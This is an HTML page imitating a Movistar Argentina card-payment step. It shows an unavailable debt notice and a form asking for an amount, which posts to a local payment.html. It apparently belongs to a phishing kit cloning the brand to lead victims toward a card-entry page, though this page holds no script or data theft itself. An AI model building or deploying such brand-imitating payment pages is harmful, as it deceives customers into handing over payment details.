<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago con Tarjeta - Movistar Argentina</title>
    <link rel="stylesheet" href="css/styles2.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
</head>
<body>
    <div class="head1">
        <header>
            <div class="logo">
                <img src="img/logo.png" alt="Logo" width="52px" height="38px">
            </div>
        </header>
    </div>
    <div class="head2">
        <div class="parte1">
            <!-- espacio en blanco -->
        </div>
        <div class="formu">
            <div class="numero">
                <div class="barra2">
                    <img src="img/barra2.jpg" alt="progreso" width="100%">
                </div>
                <center>
                    <div class="deuda">
                        <p>Deuda actual</p>
                        <p><b>No disponible, verifique en la aplicación.</b></p>
                    </div>
                </center>
            </div>
            <center>
                <div class="monto">
                    <p>¿Qué cantidad querés pagar?</p>
                    <form action="payment.html" method="post">
                        <div class="input1">
                            <input type="text" name="monto" id="monto" placeholder="Monto">
                            <br>
                            <small>Min. $5,00</small>
                        </div>
                        <div class="boton">
                            <input type="submit" value="Continuar">
                        </div>
                    </form>
                </div>
            </center>
            
        </div>
        <div class="parte3">
            <!-- espacio en blanco -->
        </div>
    </div>
</body>
</html>
